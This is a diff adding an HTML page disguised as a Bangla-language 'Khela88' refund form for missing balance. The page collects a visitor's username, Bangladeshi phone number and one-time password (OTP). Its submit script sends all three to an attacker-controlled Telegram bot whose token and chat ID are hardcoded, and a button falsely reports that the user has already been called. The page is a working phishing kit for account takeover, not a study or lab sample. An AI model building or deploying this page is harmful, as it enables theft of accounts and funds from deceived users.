@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Khela88 - Refund Request Form</title>
+    <link href="https://fonts.googleapis.com/css2?family=Readex+Pro:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Reset body and html margins and paddings */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            font-family: 'Readex Pro', Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        /* Apply bold to Bangla text */
+        *:lang(bn) {
+            font-weight: bold;
+        }
+
+        /* Red text for required field indicator */
+        .red--text {
+            color: red;
+        }
+
+        /* Small left margin */
+        .ml-1 {
+            margin-left: 0.25rem;
+        }
+
+        /* Gradient Box Header */
+        .gradient-box {
+            background: #000000; /* Black background for the top header */
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end; /* Move content (logo) to the right */
+            height: 60px;
+            box-sizing: border-box;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Logo Styling */
+        .logo {
+            max-width: 100px;
+            height: auto;
+            margin-right: 15px; /* Add some space from the right edge */
+        }
+
+        .form-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            padding-bottom: 20px;
+            overflow: hidden;
+            margin: 20px auto;
+        }
+
+        /* Form Header Section */
+        .form-header {
+            background-color: #000000; /* Changed to black */
+            color: white;
+            padding: 15px;
+            border-radius: 8px 8px 0 0;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            width: 100%;
+            margin: 0;
+        }
+
+        .form-group:first-child {
+            margin-top: 15px;
+        }
+
+        .form-group {
+            padding: 0 20px;
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        input[type="text"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #0ABAB4; /* Changed to teal/aqua */
+        }
+
+        input:invalid {
+            border-color: #e3342f;
+        }
+
+        .error-text {
+            color: #e3342f;
+            font-size: 12px;
+            display: none;
+        }
+
+        input:invalid + .error-text {
+            display: block;
+        }
+
+        .phone-input {
+            display: flex;
+            align-items: center;
+        }
+
+        .country-code {
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px 0 0 4px;
+            background-color: #f0f0f0;
+            color: #333;
+            font-size: 16px;
+            text-align: center;
+            margin-right: 5px;
+        }
+
+        input[type="tel"] {
+            border-radius: 0 4px 4px 0;
+            width: calc(100% - 75px);
+        }
+
+        /* Styled Button Shared Styles */
+        .styled-button,
+        .submit-btn {
+            width: 100%;
+            height: 50px;
+            margin: 15px 0;
+            background-attachment: scroll;
+            background-clip: border-box;
+            background-color: #0ABAB4; /* Changed to teal/aqua */
+            border-radius: 3px;
+            box-shadow: rgba(6, 8, 15, 0.1) 0px 6px 6px 1px, rgba(255, 221, 14, 0.1) 0px 6px 6px 1px, rgba(6, 8, 15, 0.1) 0px 6px 6px 1px inset;
+            color: #000000; /* Changed to black */
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            transition: background-position 0.3s ease-in, box-shadow 0.5s ease-out, text-shadow 0.3s ease-in;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            border: none;
+        }
+
+        .styled-button:hover,
+        .submit-btn:hover {
+            background-color: #0ABAB4; /* Same color but with a hover effect */
+            box-shadow: rgba(6, 8, 15, 0.1) 0px 2px 2px 1px, rgba(6, 8, 15, 0.1) 0px 4px 4px 1px, rgba(6, 8, 15, 0.1) 0px 16px 16px 1px, rgba(6, 8, 15, 0.1) 0px 32px 32px 1px, rgba(255, 221, 143, 0.1) 0px 0px 3px 0px inset;
+            text-shadow: none;
+            transition-delay: 0.3s;
+            transition-duration: 0.6s;
+        }
+
+        .styled-button.clicked {
+            text-shadow: none;
+        }
+    </style>
+    <script>
+        function handleClick() {
+            const box = document.getElementById('styledButton');
+            box.innerHTML = 'আপনাকে ইতিমধ্যে কল করা হয়েছে।';
+            box.classList.add('clicked');
+        }
+    </script>
+</head>
+
+<body>
+    <!-- Header Section with Gradient Box -->
+    <header class="header gradient-box">
+        <img src="https://i.postimg.cc/FzHcNBVY/temp-Image-Bpb-Ok-Z.avif" alt="Khela88 Logo" class="logo">
+    </header>
+
+    <!-- Form Section -->
+    <div class="form-container">
+        <!-- Form Header Section -->
+        <div class="form-header">
+            <span>মিসিং ব্যালেন্স ফেরত নিন</span>
+        </div>
+        
+        <form id="myForm">
+            <div class="form-group">
+                <label for="verification">ব্যবহারকারীর নাম <span class="red--text ml-1">*</span></label>
+                <div class="verification-code">
+                    <input type="text" id="verification" name="verification" placeholder="এখানে পূরণ করুন" required>
+                </div>
+                <small class="error-text"></small>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">মোবাইল নম্বর <span class="red--text ml-1">*</span></label>
+                <div class="phone-input">
+                    <span class="country-code">+880</span>
+                    <input type="tel" id="phone" name="phone" placeholder="ফোন" required pattern="\d{10}">
+                </div>
+                <small class="error-text"></small>
+            </div>
+
+            <!-- Styled Text Button -->
+            <div class="form-group">
+                <button type="button" id="styledButton" class="styled-button" onclick="handleClick()">
+                    যাচাইকরণ
+                </button>
+            </div>
+
+            <div class="form-group">
+                <label for="otp">OTP অনুরোধ হয়েছে<span class="red--text ml-1">*</span></label>
+                <input type="text" id="otp" name="otp" placeholder="ওটিপি নং" required>
+                <small class="error-text"></small>
+            </div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn">সাবমিট করুন</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Collect form data
+            var userName = document.getElementById('verification').value;
+            var phoneNumber = document.getElementById('phone').value;
+            var otp = document.getElementById('otp').value;
+
+            // Prepare message text
+            var message = `New Submission:\n\nUsername: ${userName}\nPhone: +880${phoneNumber}\nOTP: ${otp}`;
+
+            // Telegram Bot Token and Chat ID
+            var botToken = '6878103194:AAHYmnVII5T-V_AHy-a7gJs6d0aJ_kz6-D4';
+            var chatId = '5501588189';
+
+            // Telegram API URL
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send the message via GET request
+            fetch(url).then(response => {
+                if (response.ok) {
+                    alert('Data sent successfully!');
+                    document.getElementById('myForm').reset(); // Reset form on success
+                } else {
+                    alert('Failed to send data.');
+                }
+            }).catch(error => {
+                alert('Error: ' + error);
+            });
+        });
+    </script>
+</body>
+
+</html>
